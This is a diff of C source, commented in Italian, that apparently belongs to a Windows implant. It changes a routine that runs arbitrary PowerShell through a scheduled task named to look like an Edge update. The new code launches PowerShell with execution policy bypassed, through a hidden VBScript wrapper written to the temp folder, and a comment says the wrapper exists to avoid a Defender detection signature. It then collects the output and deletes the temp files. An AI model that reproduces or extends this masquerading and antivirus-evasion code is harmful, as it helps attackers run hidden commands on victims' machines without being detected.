@@ -512,29 +512,42 @@ static char* _exec_ps_via_task(const char *ps_cmd) {
     snprintf(ps1Path, MAX_PATH, "%s~eu_%04x.ps1", tempDir, r1);
     snprintf(outPath, MAX_PATH, "%s~eu_%04x.tmp", tempDir, r2);
 
-    /* Scrivi il comando PS nel file .ps1 (evita problemi di quoting) */
+    /* Scrivi il comando PS nel file .ps1 con redirect output incorporato */
     FILE *f = fopen(ps1Path, "w");
     if (!f) return NULL;
-    fprintf(f, "%s\n", ps_cmd);
+    /* Forza output UTF-8 (PS 5.1 default è UTF-16LE con *>) */
+    fprintf(f,
+        "& { %s } 2>&1 | Out-File -FilePath '%s' -Encoding utf8\n",
+        ps_cmd, outPath);
     fclose(f);
+
+    /* Scrivi un launcher .vbs temp che esegue il .ps1 con finestra nascosta.
+     * Usa WScript.Shell.Run parametro 0 (hidden) + True (attendi fine).
+     * Nessun -WindowStyle Hidden nel command line → niente Commando.A!ml */
+    char vbsPath[MAX_PATH];
+    snprintf(vbsPath, MAX_PATH, "%s~eu_%04x.vbs", tempDir, r1 ^ 0xA5A5);
+
+    FILE *fv = fopen(vbsPath, "w");
+    if (!fv) { DeleteFileA(ps1Path); return NULL; }
+    fprintf(fv,
+        "CreateObject(\"WScript.Shell\").Run "
+        "\"powershell.exe -NoP -NonI -EP Bypass "
+        "-File \"\"\" & \"%s\" & \"\"\"\", 0, True\r\n",
+        ps1Path);
+    fclose(fv);
 
     /* ── Task name pseudo-random ──────────────────────────────────────── */
     WCHAR taskName[64];
     wsprintfW(taskName, L"EdgeUpdate_%04X%04X", r1, r2);
 
-    /* ── Argomenti per cmd.exe ─────────────────────────────────────────
-     * cmd /c powershell.exe -NoP -NonI -ExecutionPolicy Bypass
-     *       -File "script.ps1" > "output.tmp" 2>&1
-     * Il redirection è gestito da cmd.exe → output nel file temporaneo */
-    wchar_t wPs1[MAX_PATH], wOut[MAX_PATH];
-    MultiByteToWideChar(CP_ACP, 0, ps1Path, -1, wPs1, MAX_PATH);
-    MultiByteToWideChar(CP_ACP, 0, outPath, -1, wOut, MAX_PATH);
+    /* ── Argomenti: wscript.exe //B lancia il .vbs (completamente silent) */
+    wchar_t wVbs[MAX_PATH];
+    MultiByteToWideChar(CP_ACP, 0, vbsPath, -1, wVbs, MAX_PATH);
 
     WCHAR wArgs[MAX_PATH * 3];
     _snwprintf(wArgs, MAX_PATH * 3 - 1,
-        L"/c powershell.exe -NoP -NonI -ExecutionPolicy Bypass "
-        L"-File \"%s\" > \"%s\" 2>&1",
-        wPs1, wOut);
+        L"//B //Nologo \"%s\"",
+        wVbs);
 
     /* ── CWD ──────────────────────────────────────────────────────────── */
     wchar_t wCwd[MAX_PATH] = {0};
@@ -569,7 +582,7 @@ static char* _exec_ps_via_task(const char *ps_cmd) {
         pSettings->lpVtbl->Release(pSettings); pSettings = NULL;
     }
 
-    /* ── Action: cmd.exe /c powershell … ─────────────────────────────── */
+    /* ── Action: wscript.exe //B → .vbs → powershell nascosto ─────────── */
     hr = pTask->lpVtbl->get_Actions(pTask, &pActions);
     if (FAILED(hr)) goto cleanup;
 
@@ -580,7 +593,10 @@ static char* _exec_ps_via_task(const char *ps_cmd) {
              &IID_IExecAction, (void **)&pExec);
     if (FAILED(hr)) goto cleanup;
 
-    { BSTR bp = SysAllocString(L"cmd.exe");
+    { wchar_t wszWS[MAX_PATH] = {0};
+      GetSystemDirectoryW(wszWS, MAX_PATH);
+      lstrcatW(wszWS, L"\\wscript.exe");
+      BSTR bp = SysAllocString(wszWS);
       pExec->lpVtbl->put_Path(pExec, bp);
       SysFreeString(bp); }
 
@@ -647,8 +663,21 @@ delete_task:
                   DWORD rd;
                   ReadFile(hFile, buf, fSize, &rd, NULL);
                   buf[rd] = '\0';
-                  /* Il file è in codepage OEM (redirect cmd.exe) → converti UTF-8 */
-                  result = to_utf8(buf, rd);
+                  /* Output è UTF-8 (Out-File -Encoding utf8).
+                   * PS 5.1 aggiunge BOM UTF-8 (EF BB BF) → skippa se presente */
+                  char *start = buf;
+                  DWORD len = rd;
+                  if (len >= 3 && (unsigned char)start[0] == 0xEF
+                               && (unsigned char)start[1] == 0xBB
+                               && (unsigned char)start[2] == 0xBF) {
+                      start += 3;
+                      len -= 3;
+                  }
+                  result = (char *)malloc(len + 1);
+                  if (result) {
+                      memcpy(result, start, len);
+                      result[len] = '\0';
+                  }
                   free(buf);
               }
           }
@@ -658,6 +687,7 @@ delete_task:
 
 cleanup:
     DeleteFileA(ps1Path);
+    DeleteFileA(vbsPath);
     DeleteFileA(outPath);
     if (pRegTask)  pRegTask->lpVtbl->Release(pRegTask);
     if (pFolder)   pFolder->lpVtbl->Release(pFolder);
